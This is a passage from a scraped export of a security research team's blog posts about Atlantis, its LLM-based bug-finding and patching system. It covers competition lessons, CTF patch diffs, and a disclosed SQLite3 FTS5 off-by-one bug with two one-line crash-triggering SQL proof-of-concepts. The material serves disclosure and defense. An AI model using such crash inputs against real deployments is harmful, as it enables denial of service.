patches without PoVs, but we deliberately chose not to‚Äîa strategic decision we debated extensively and validated through our internal benchmark.\nPost-competition, we\u0026rsquo;re excited to explore PoV-free patching\u0026rsquo;s full potential.\nL3. LLM 101: How to Babysit Jack-Jack? During our CTFRadio interview, Yan mentioned that Shellfish had to babysit LLMs for their agents. The analogy resonates: LLMs are like Jack-Jack Parr from Incredibles‚Äî a superpowered baby with multiple, unpredictable abilities that even his superhero parents don\u0026rsquo;t fully understand.\nLike Jack-Jack, LLMs have not one superpower but many, and we\u0026rsquo;re still discovering how to harness them effectively. We \u0026ldquo;gaslight\u0026rdquo; our LLMs into specific roles, telling them they\u0026rsquo;re \u0026ldquo;security researchers\u0026rdquo; or even researchers from Google DeepMind.\nThe Evolution of Prompting Techniques. Throughout the competition, we witnessed firsthand the rapid evolution of foundation models and prompting strategies. Early tricks like \u0026ldquo;I\u0026rsquo;ll give you a $200 tip\u0026rdquo; surprisingly generated longer, more detailed responses. Techniques multiplied: Chain-of-Thought (CoT), Tree-of-Thoughts (ToT), Self-Consistency (SC).\nWe tested everything and integrated what worked, like \u0026ldquo;Think step by step\u0026rdquo; prompts. Agentic architectures evolved in parallel: ReAct, Reflection, tool use, multi-agent systems, sub-agents‚Äî we adopted many (as shown above).\nManaging Rapid Change. The pace of change in the LLM space is unprecedented. Every vendor claims benchmark supremacy, making it impossible to evaluate every new claim or technique.\nOur solution: continuous empirical testing. We evaluate performance daily through CI using our internal benchmark, monitoring for sudden drops or improvements. (Shellfish even built an LLM agent specifically for this task!)\nTo avoid vendor lock-in, we built abstraction layers. LiteLLM serves as our proxy, multiplexing requests and responses across different LLM providers for each agent.\nHandling External Dependencies. Since LLMs are externally managed services, Atlantis must handle various failure modes:\nToken limits exceeded Daily/subscription quotas hit Unexplained downtime or delays We experienced all of these during the exhibition rounds and built resilience mechanisms accordingly.\nL4. LLM-Augmented, LLM-Opinionated, and LLM-Driven Atlantis employs LLMs through three distinct integration strategies, each with different levels of trust and autonomy.\nLLM-Augmented: Extending Traditional Tool. In this approach, LLMs enhance traditional analysis techniques where conventional methods struggle with scale. Fuzzing tools integrate LLMs for:\nInput generation Dictionary generation Seed generation Here, LLMs fill gaps where traditional techniques fail to scale to real-world software complexity.\nLLM-Opinionated: Optimistic Suggestions. Tools like Testlang and Harness Reverser operate with calculated risk. LLMs provide likelihood-based suggestions that workflows treat as hints‚Äîsimilar to optimistic concurrency control.\nWhen predictions are correct, the system benefits significantly. When wrong, we pay a performance penalty but maintain correctness.\nLLM-Driven: Autonomous Navigation. Our most ambitious approach gives LLMs full autonomy. The MLLA agent and POC Gen in Java CRS autonomously navigate code repositories, generating \u0026ldquo;blobs\u0026rdquo;‚Äîinputs designed to trigger identified bugs from diffs or SARIF reports.\nThis strategy bets on LLMs having latent security intuition buried in their weights, allowing them to reason about entire codebases independently.\nSo How Well Did Atlantis Perform? Atlantis dominated the scoreboard, earning top scores in nearly every category. Remarkably, we accumulated roughly the same total points as the second and third place teams combined.\nWhile we\u0026rsquo;re still analyzing the complete dataset, early observations suggest our CRS excelled on certain challenge projects (like Wireshark) where other teams struggled. Our conservative strategy proved decisive: high accuracy in crash reports and patches yielded a near-perfect accuracy multiplier, while our strong bundle scores validated our careful approach to matching PoVs with patches and SARIF reports.\nReal-World Bugs. Does this approach work in the wild? During the final, all competing CRSs collectively discovered 6 C/C++ bugs and 12 Java bugs in real-world software. Atlantis contributed 3 of each category, including a 0-day vulnerability in SQLite discovered during the semi-final.\nWhat\u0026rsquo;s Next? For a casual discussion of our journey and lessons learned, check out our CTFRadio interview:\nOpen Source Release. Our competition CRS code is publicly available, but the current system requires substantial infrastructure: Microsoft Azure deployment, Terraform, Kubernetes, Tailscale, and external LLM service dependencies.\nTo make Atlantis accessible to the broader community, we\u0026rsquo;re creating a streamlined fork that:\nRemoves competition-specific APIs Runs on a single workstation via Docker Compose Includes a revised benchmark suite for standardized evaluation Call for Collaboration. We\u0026rsquo;re launching continuous bug hunting on OSS-Fuzz projects. To sustain this effort, Team Atlanta is donating $2.0M (50% of our prize) to SSLab at Georgia Tech for:\nOngoing research in autonomous security systems with LLM Expenses to continuously run Atlantis to open source projects Scholarship to PhD students and postdocs Join us in advancing autonomous security research! And we are seeking funding for public research \u0026ndash; OpenAI joined this effort to make donation to us along with the API credits.\nComing Soon.\nTechnical Report: Detailed system architecture and findings (releasing in two weeks) Blog Series: Deep dives into specific CRS components and strategies Postmortem: Analysis of the final competition data and effectiveness of each techniques/CRSs "},{"section":"Blog","slug":"/blog/post-tkctf-2024/","title":"Hacking Redefined: How LLM Agents Took on University Hacking Competition","description":"Atlantis in CTF competitions","date":"December 3, 2024","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/tkctf2024/ai-vs-human_hu_1cca12a5e59caa7e.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"315\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/tkctf2024\\/ai-vs-human_hu_b2d4288e091735d0.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/tkctf2024/ai-vs-human_hu_e893e5f2759e3f4b.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/tkctf2024\\/ai-vs-human_hu_4deee4d9fabe84eb.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Milestone","tags":"Atlantis CRS","content":"For the first time, we deployed our hybrid system, powered by LLM agents‚ÄîAtlantis‚Äîto compete in Georgia Tech‚Äôs flagship CTF event, TKCTF 2024. During the competition, Atlantis concentrated on two pivotal areas: vulnerability analysis and automatic vulnerability remediation. Remarkably, the system uncovered 10 vulnerabilities and produced 7 robust patches1, showcasing the practicality and promise of our approach in a real-world hacking competition.\nIn this blog, I‚Äôll delve into some fascinating insights and essential lessons from the CTF experience. As we prepare to open-source the full details of our system following AIxCC competition rules, this milestone reflects more than just a technical achievement‚Äîit embodies our commitment to advancing LLM-driven security research.\nWhat might appear as another incremental step in CTF competitions actually marks a significant leap in our journey. The success of Atlantis at TKCTF was a testament to the dedication and expertise of our exceptional team: Andrew Chin, Jiho Kim, Gyejin Lee, Seunggi Min, Kevin Stevens, Woosun Song, and Hanqing Zhao,\nWe invite you to follow us on Twitter/X (@TeamAtlanta24) to stay updated on our work at the intersection of AI and security.\nAIxCC, Atlantis CRS, and CTF AIxCC Finalists\rAI Cyber Challenge (AIxCC) is a two-year competition designed to advance the state of the art in AI-based security research. We, Team Atlanta, are proud to be one of the 7 finalist teams, presenting a novel cyber reasoning system, Atlantis CRS.\nThe concept behind our system is straightforward: emulate the mindset of skilled security researchers and hackers using LLM agents, augmented by advanced program analysis techniques.\nAs seasoned veterans of CTF competitions, we‚Äôve always aspired to bring AI and LLMs into the CTF arena. This time, we deployed our system alongside human players, concentrating on analyzing source code repositories and patching identified vulnerabilities. Georgia Tech‚Äôs CTF competition, TKCTF, offered the perfect setting to put our system to the test.\nThe challenges were designed by students and staff from Georgia Tech‚Äôs CS6265 Fall 2024 class. In addition to Georgia Tech participants, teams from across the University System of Georgia (USG) joined the competition. The winning team received a $1,000 prize.\nRecap of Atlantis\u0026rsquo;s Performance Atlantis Dashboard\rOver the course of the competition, we ran Atlantis CRS on 12 different CTF challenges, each with a time limit of approximately 4 hours. By the end, our system successfully identified 10 vulnerabilities and generated 7 robust patches.\nWhile the overall difficulty of the challenges was moderate, Atlantis successfully identified most of the intended memory safety vulnerabilities and even uncovered two unintended vulnerabilities. The competition also provided several interesting cases and valuable lessons, which I‚Äôll share below.\nMaze Puzzles One of the challenges was a maze puzzle. It generated a random maze where the intended solution required players to write an algorithm to parse the map and find the path through the maze.\nClick to view an example of the maze puzzle ./target ######################################### #P* * * * * * # # *** ***** * *** * *** *** * ******* * # # * * * * * * * * * # #** ***** ***** * * * * *********** *** # # * * * * * * * * * * # # *** * *** ***** *** *** * * * ******* # # * * * * * * * * * # # *** *** * * * *** *** * * ************# # * * * * * * * * * * # #****** * ******* *** *** ********* * * # # * * * * * * * * * # # * ******* * ***** *** * * ******* *** # # * * * * G# ######################################### Steps: 0 ========= # another run ./targetteps: 0 ========= Interestingly, Atlantis correctly navigated the maze through several runs of trial and error. This demonstrated the ability of LLM agents to enhance program analysis by ‚Äúunderstanding‚Äù the high-level intent of a program.\nDiscovering Unintended Vulnerabilities Beyond the intended vulnerabilities, Atlantis also discovered two unintended ones:\nFloating Point Exception (FPE): A vulnerability causing stack underflow. Insufficient Input Validation: An unchecked empty input led to a stack buffer overflow. Although the challenges were not overly complex, this highlights Atlantis‚Äôs potential in automated testing and vulnerability discovery.\nUndiscovered Vulnerabilities Due to Logic Flaws Atlantis struggled with challenges involving logical flaws. For example, in the two-sum challenge:\nChallenge Details: The task didn‚Äôt involve memory safety issues but required exploiting unordered_map hash collisions to manipulate the control flow in the twoSum function. Missed Opportunity: Since Atlantis was tuned to prioritize memory safety issues, it overlooked this logic-based vulnerability. This underscored the need to enhance Atlantis‚Äôs capabilities in analyzing logical vulnerabilities, an area we plan to focus on in future improvements.\nCase Studies: How Atlantis Patches Vulnerabilities A standout feature of Atlantis is its capability to generate patches for discovered vulnerabilities. In this CTF, Atlantis produced 7 fully sound patches, showcasing both the system‚Äôs confidence and its ease in handling the challenges, which were relatively straightforward.\nIn this section, I‚Äôll provide a summary of key cases and the patching decisions made by Atlantis‚Äôs agent system.\nUnsafe functions replaced by safer ones diff --git a/double_trouble.c b/double_trouble.c index 83a693b..e8f0737 100644 --- a/double_trouble.c +++ b/double_trouble.c @@ -5,8 +5,9 @@ void foo(char *msg) { char buf[80]; - strcpy(buf, msg); // Vulnerable: No bounds checking - strcpy(msg, buf); // Vulnerable: No bounds checking + strncpy(buf, msg, sizeof(buf) - 1); // Use strncpy for bounds checking + buf[sizeof(buf) - 1] = \u0026#39;\\0\u0026#39;; // Ensure null termination + strncpy(msg, buf, strlen(msg)); // Use strncpy for bounds checking } One of the principles guiding Atlantis is avoiding the use of unsafe functions. For instance, in one case, Atlantis replaced strcpy with strncpy and added a null termination check to ensure the safety of string operations. Given that the C language inherently includes many unsafe functions, Atlantis takes a conservative approach by systematically replacing these functions with their safer counterparts wherever possible.\nBounds checking and termination handling diff --git a/target.c b/target.c index f512754..7f7bfef 100644 --- a/target.c +++ b/target.c @@ -23,9 +23,16 @@ func run_at_end = dont_print_key; uint32_t read_int(void) { char buf[10]; ssize_t size = read(0, buf, sizeof(buf) - 1); + if (size \u0026lt;= 0) { + if (size == 0) { + printf(\u0026#34;Error: End of input stream\\n\u0026#34;); + } else { + perror(\u0026#34;Error: Read failed\u0026#34;); + } + return 0; // or handle error as needed + } buf[size] = \u0026#39;\\0\u0026#39;; uint32_t res = atoi(buf); - return res; } diff --git a/ymca.c b/ymca.c index 5bf7de7..ca10ea1 100644 --- a/ymca.c +++ b/ymca.c @@ -87,7 +87,10 @@ bool is_in_array(int step, int arr[], int size) { void vulnerable() { char buffer[64]; printf(\u0026#34;Enter your Steps of the YMCA Song:\\n\u0026#34;); - read(STDIN_FILENO, buffer, 1000); + ssize_t bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer) - 1); + if (bytes_read \u0026gt; 0) { + buffer[bytes_read] = \u0026#39;\\0\u0026#39;; // Null-terminate the buffer + } } diff --git a/rop.c b/rop.c index 5df7c9c..c858436 100644 --- a/rop.c +++ b/rop.c @@ -83,7 +83,7 @@ int main(int argc, char** argv) { fgets(buf, sizeof(buf), stdin); // make newline null terminator int input_len = strlen(buf); - if (buf[input_len - 1] == \u0026#39;\\n\u0026#39;) { + if (input_len \u0026gt; 0 \u0026amp;\u0026amp; buf[input_len - 1] == \u0026#39;\\n\u0026#39;) { buf[input_len - 1] = \u0026#39;\\0\u0026#39;; } Out-of-bounds vulnerabilities are among the most common issues in software. Atlantis addresses this by employing dedicated optimizations to thoroughly check array and memory bounds, ensuring that user inputs are constrained within a safe range. This proactive approach minimizes the risk of unintended memory access and enhances overall software reliability.\nSafe rewrite of the entire function diff --git a/target.c b/target.c index c364280..712ac08 100755 --- a/target.c +++ b/target.c @@ -14,25 +14,27 @@ int null_pos = -1; int newline_pos = -1; void copy_buffer(unsigned char* buf) { -\tnull_pos = -1; -\tnewline_pos = -1; -\tint i = 0; -\twhile (i \u0026lt; BUF_SIZE) { -\tif (newline_pos \u0026lt; 0 \u0026amp;\u0026amp; gbuf[i] == 0xa) { -\tnewline_pos = i; -\t} -\tif (null_pos \u0026lt; 0 \u0026amp;\u0026amp; gbuf[i] == 0x0) { -\tnull_pos = i; -\t} -\tgbuf[i] = (gbuf[i] ^ key[i]) \u0026amp; 0xff; -\ti++; -\t} -\tint j = 0; -\twhile (j \u0026lt; min(null_pos, newline_pos)) { -\tbuf[j] = gbuf[j]; -\tj++; -\t} -\tprintf(\u0026#34;Copied %d of %d bytes!\\n\u0026#34;, min(null_pos, newline_pos), strlen(gbuf)); + null_pos = BUF_SIZE; + newline_pos = BUF_SIZE; + int i = 0; + while (i \u0026lt; BUF_SIZE) { + if (newline_pos == BUF_SIZE \u0026amp;\u0026amp; gbuf[i] == 0xa) { + newline_pos = i; + } + if (null_pos == BUF_SIZE \u0026amp;\u0026amp; gbuf[i] == 0x0) { + null_pos = i; + } + gbuf[i] = (gbuf[i] ^ key[i]) \u0026amp; 0xff; + i++; + } + int j = 0; + int copy_len = min(null_pos, newline_pos); + copy_len = min(copy_len, 20); // Ensure we don\u0026#39;t exceed buf size + while (j \u0026lt; copy_len) { + buf[j] = gbuf[j]; + j++; + } + printf(\u0026#34;Copied %d of %d bytes!\\n\u0026#34;, copy_len, BUF_SIZE); } Atlantis typically aims to keep patches minimal, modifying the fewest possible lines to reduce the risk of altering intended code behavior or introducing unsoundness. However, after several iterations, if Atlantis cannot produce an optimal minimal patch, it will optionally rewrite the entire function to comprehensively address the vulnerability. This approach balances precision with robustness, ensuring both safety and functionality.\nError handling correction diff --git a/stackmachine.c b/stackmachine.c index 7b95b62..d00d75f 100644 --- a/stackmachine.c +++ b/stackmachine.c @@ -88,11 +88,11 @@ void push(int *values, int *idx, int elt) { int pop(const int *values, int *idx) { if (*idx \u0026lt;= START) { myerrno = -1; - return 0; + return INT_MIN; // Return a special error code } (*idx)--; - int ret = values[*idx]; - return ret; + return values[*idx]; +} } void main_loop(); @@ -144,9 +144,13 @@ void print_utf8(wchar_t *wcs) { */ void ret(int *values, int *idx) { r1 = pop(values, idx); - if (myerrno != 0) { return; } + if (myerrno != 0 || r1 == INT_MIN) { + puts(\u0026#34;Error: Attempted to pop from an empty stack.\u0026#34;); + return; + } printf(\u0026#34;%d\\n\u0026#34;, r1); } +} For bugs involving inter-procedural logic, Atlantis analyzes cross-procedural data flow and incorporates error handling into its patches. For instance, when addressing a vulnerability in stackmachine.c, Atlantis correctly handled the error case by introducing logic to return a special error code, ensuring robust and predictable behavior.\nThat said, the patches produced during this competition don‚Äôt fully showcase Atlantis‚Äôs potential, as the challenges lacked sophistication. For a more advanced example, check out our work on the SQLite3 zero-day vulnerability. Since then, Atlantis has undergone multiple rounds of improvement, and we remain committed to open-sourcing the full details of our system after the AIxCC competition.\nUnsound Patches Atlantis was unable to patch three of the challenges due to unsound patches. Two of these failures stemmed from the puzzle-like nature of the challenges:\nMaze Challenge: This challenge required finding the path through a maze. A patch that fixes the vulnerability inadvertently altered the intended behavior, conflicting with the challenge\u0026rsquo;s goals. Shellcode-Golf Challenge: This challenge demanded crafting a specific shellcode to pass a verification check. A patch that addressed the vulnerability ended up modifying the check logic, effectively changing the intended behavior. The third unsound patch occurred due to the complexity of inter-procedural logic, which presented challenges for Atlantis in accurately resolving the issue without disrupting the intended program flow.\nClick me to show the pseudo code uint32_t foo(void) { char buf[10]; ssize_t size = read(0, buf, sizeof(buf) - 1); buf[size] = \u0026#39;\\0\u0026#39;; uint32_t res = atoi(buf); return res; } void main_loop() { while (1) foo(); } When a read operation fails due to empty input, the size variable becomes -1, leading to a stack underflow and subsequent crash. While Atlantis‚Äôs patch system successfully addresses the root cause and prevents an ASAN crash, it inadvertently introduces an infinite loop due to the lack of handling for empty input within the main loop. As a result, this patch is deemed unsound because it fails to fully resolve the issue in a functional and robust manner.\nTeam Atlanta\u0026rsquo;s Next Steps Frankly, Atlantis still has a long way to go before becoming a seamless autonomous CTF competitor for pwnable challenges, which remains one of our team‚Äôs long-term goals.\nTo move closer to this vision, we are focusing on the following improvements to create a fully autonomous CTF pwner agent:\nChallenge Understanding:\nWhile we concentrate on pwnable challenges, modern pwnables often come in diverse formats, such as kernel drivers and patched browsers. Atlantis needs to identify the challenge format and generate appropriate analysis code to handle these variations, aiming for more general-purpose functionality.\nBinary Analysis Support:\nCurrently, Atlantis supports only source code repositories. Since many CTF challenges are distributed as binaries, we plan to integrate our own decompilation framework to enable binary analysis. This approach will offer a tailored experience, moving beyond existing tools like IDA Pro to provide more comprehensive support.\nAutomatic Exploit Generation:\nAt present, Atlantis can only generate Proof-of-Concept (PoC) code to trigger vulnerabilities. Our goal is to enable the generation of more powerful exploits, such as arbitrary read/write primitives, expanding its utility and effectiveness in real-world scenarios.\nCustomized LLM Models:\nWe are working on customizing LLM models specifically for security analysis. Tailored models could reduce the need for sophisticated prompts, simplify our system architecture, and improve both speed and accessibility, making Atlantis more efficient and user-friendly.\nBy addressing these challenges, we aim to push the boundaries of AI in cybersecurity and bring Atlantis closer to becoming a fully autonomous and versatile competitor.\nThe Ending Note As someone from a generation that grew up learning computer science through CTF competitions, I can confidently say that CTFs have been instrumental in teaching us about operating systems and security. Looking ahead, I sincerely hope that CTFs will once again serve as a platform to teach us how to develop new language models and agents for security research.\nI hope our first step in TKCTF 2024 inspires more researchers to join this vibrant and innovative community. If you‚Äôre passionate about AI or security, I invite you to follow us on Twitter/X (@TeamAtlanta24) and join us on this exciting journey.\nFully sound patches address root causes while preserving correct system behavior.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"section":"Blog","slug":"/blog/post-asc-sqlite/","title":"Autonomously Uncovering and Fixing a Hidden Vulnerability in SQLite3 with an LLM-Based System","description":"SQLite3 in ASC","date":"August 28, 2024","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/asc-sqlite/sqlite-bug-finding_hu_a9e04e86be1a5c41.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"315\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/asc-sqlite\\/sqlite-bug-finding_hu_2fc6cc4e4258aef8.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/asc-sqlite/sqlite-bug-finding_hu_a8b2201771155688.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/asc-sqlite\\/sqlite-bug-finding_hu_e756cbb8915fac76.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Vulnerability Analysis","tags":"Atlantis CRS","content":"Without knowing beforehand that the challenge project involved SQLite3, our team, Team Atlanta, entered our Cyber Reasoning System (CRS), named Atlantis, into the AI Cyber Challenge organized by ARPA-H, DARPA, and the White House.\nRemarkably, Atlantis secured six first-bloods and autonomously identified and patched a real bug in SQLite31, earning us a $2 million prize and a place in the grand finals of AIxCC. For more details, check out our team\u0026rsquo;s announcement blog.\nIn this blog, we will outline our very high-level approach to using LLMs for bug detection and vulnerability remediation, provide an analysis of the fixed SQLite3 vulnerability, and discuss the challenges of using our LLM agents for such fixes.\nFollow us on Twitter/X (@TeamAtlanta24) if you\u0026rsquo;re interested in AI or security.\nThe Atlantis Cyber Reasoning System Atlantis is a end-to-end, large language model (LLM)-based bug-finding and fixing system designed to function entirely without human intervention. It is capable of handling complex systems like the Linux kernel and supports a range of modern programming languages, including C/C++, Java, and others.\nOur design philosophy is simple: to emulate the mindset of experienced security researchers and hackers through LLM agents, enhanced with advanced program analysis techniques.\nAtlantis is specifically designed to replicate the behavior of human researchers, particularly in auditing the Git repositories of open-source software (OSS). To harness the full potential of LLMs and address their limitations in tackling complex problems, we incorporate traditional program analysis techniques (both dynamic and static) to assist LLMs in decision-making.\nOne of the interesting features of Atlantis is our \u0026ldquo;baby-security-AGI\u0026rdquo; system, which can emulate the code auditing process based on the habits of the security experts on our team. It\u0026rsquo;s not magic; we\u0026rsquo;ve distilled our collective experience and common practices in manual auditing and reverse engineering into structured prompts, significantly enhancing the system\u0026rsquo;s capabilities.\nAll source code will be open-sourced in accordance with the AIxCC competition rules.\nThe Off-by-One Access in SQLite3 The hidden vulnerability was discovered in the FTS5 module of SQLite3 (link). The bug is located in the trigram tokenizer, which processes each contiguous sequence of three characters as a token, enabling FTS5 to support more general substring matching.\nWhen creating a virtual table, users can specify options in the trigram field (e.g., case_sensitive 1) as outlined in the documentation.\nHowever, if users fail to provide key-value pairs, SQLite3 does not adequately check for this and assumes that the value is present. This assumption can lead to an off-by-one access error. Because SQLite3 allocates a sufficient heap buffer in such cases, the off-by-one access is confined to the space within an allocated heap chunk. Additionally, due to SQLite\u0026rsquo;s good coding practices, it uses MallocZero to ensure no uninitialized variables exist, which ultimately results in a zero pointer dereference.\nClick me to show the vulnerable code in SQLite3 static int fts5TriCreate( void *pUnused, const char **azArg, int nArg, Fts5Tokenizer **ppOut ){ int rc = SQLITE_OK; TrigramTokenizer *pNew = (TrigramTokenizer*)sqlite3_malloc(sizeof(*pNew)); UNUSED_PARAM(pUnused); if( pNew==0 ){ rc = SQLITE_NOMEM; }else{ int i; pNew-\u0026gt;bFold = 1; pNew-\u0026gt;iFoldParam = 0; for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ const char *zArg = azArg[i+1]; \u0026lt;---- off-by-one if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ \u0026lt;----null dereference rc = SQLITE_ERROR; }else{ pNew-\u0026gt;bFold = (zArg[0]==\u0026#39;0\u0026#39;); } }else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;remove_diacritics\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ \u0026lt;-- rc = SQLITE_ERROR; }else{ pNew-\u0026gt;iFoldParam = (zArg[0]!=\u0026#39;0\u0026#39;) ? 2 : 0; } }else{ rc = SQLITE_ERROR; } } if( pNew-\u0026gt;iFoldParam!=0 \u0026amp;\u0026amp; pNew-\u0026gt;bFold==0 ){ rc = SQLITE_ERROR; } if( rc!=SQLITE_OK ){ fts5TriDelete((Fts5Tokenizer*)pNew); pNew = 0; } } *ppOut = (Fts5Tokenizer*)pNew; return rc; } Working proof-of-concepts (PoCs) to trigger the bug are as follows:\nPoC 1: CREATE VIRTUAL TABLE t USING fts5(s, tokenize=\u0026#39;trigram case_sensitive\u0026#39;); PoC 2: CREATE VIRTUAL TABLE t USING fts5(s, tokenize=\u0026#39;trigram remove_diacritics\u0026#39;); While human researchers might consider this bug trivial, I am still pleased that our system enabled us to be the only team to discover a real bug‚Äîeven without knowing that the challenge project was SQLite3.\nAuto-Generated Patch vs Human-Write Patch Automatically patching the aforementioned bug is challenging because a perfect patch2 requires the human or AI patcher to understand that the arguments are paired and that the null pointer dereference results from an off-by-one heap access within a glibc-allocated heap chunk.\nIn other words, the actual root cause is a semantic inconsistency concerning the paired arguments. Therefore, the patcher needs to recognize that the code must verify if the number of arguments is even.\nGenerating Patches Using a Naive Zero-Shot Prompt To get a basic sense of how LLMs reason about patch generation, I asked the models to analyze the root cause and generate a patch for the given bug using the crash logs, PoCs, and the code of the fts5TriCreate() function.\nA patch generated by Claude 3.5 sonnet --- a/sqlite3.c +++ b/sqlite3.c @@ -255841,7 +255841,7 @@ static int fts5TriCreate( for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ const char *zArg = azArg[i+1]; if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ - if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ + if( !zArg || (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; }else{ pNew-\u0026gt;bFold = (zArg[0]==\u0026#39;0\u0026#39;); @@ -255849,7 +255849,7 @@ static int fts5TriCreate( }else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;remove_diacritics\u0026#34;) ){ - if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ + if( !zArg || (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; }else{ pNew-\u0026gt;iFoldParam = (zArg[0]!=\u0026#39;0\u0026#39;) ? 2 : 0; A patch generated by ChatGPT 4o --- a/sqlite3.c +++ b/sqlite3.c @@ -255835,11 +255835,15 @@ pNew-\u0026gt;iFoldParam = 0; for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ const char *zArg = azArg[i+1]; - if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ + if( i+1 \u0026gt;= nArg || azArg[i+1] == NULL ){ + rc = SQLITE_ERROR; + }else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; }else{ pNew-\u0026gt;bFold = (zArg[0]==\u0026#39;0\u0026#39;); } }else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;remove_diacritics\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; The patches are fairly close to \u0026ldquo;good patches,\u0026rdquo; and the models almost identify the root causes. However, due to my simple zero-shot prompt, there are still a few minor issues. For example, the patch generated by Claude effectively mitigates the bug by ensuring that a null pointer is always handled when the bug is triggered, but it doesn\u0026rsquo;t fully address the off-by-one root cause. The patch generated by GPT-4o addresses the bounds check but only covers the case_sensitive branch, missing the remove_diacritics branch.\nNonetheless, the results are promising given that a simple prompt was used, and the LLMs almost arrived at the correct solution. However, in real-world scenarios, patch generation can be much more challenging, as it requires locating the source code of the vulnerable parts in a large codebase, dealing with indeterminate results, handling hallucinations, and validating correctness, among other issues.\nPatch Generated by Atlantis CRS Atlantis CRS generates patches by incrementally applying domain-specific knowledge with multiple LLM agents and iteratively refining them using a custom validation oracle. The patch generated by Atlantis is as follows:\ndiff --git a/ext/fts5/fts5_tokenize.c b/ext/fts5/fts5_tokenize.c index f12056170..552f14be9 100644 --- a/ext/fts5/fts5_tokenize.c +++ b/ext/fts5/fts5_tokenize.c @@ -1299,8 +1299,10 @@ static int fts5TriCreate( pNew-\u0026gt;bFold = 1; pNew-\u0026gt;iFoldParam = 0; for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ - const char *zArg = azArg[i+1]; - if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ + const char *zArg 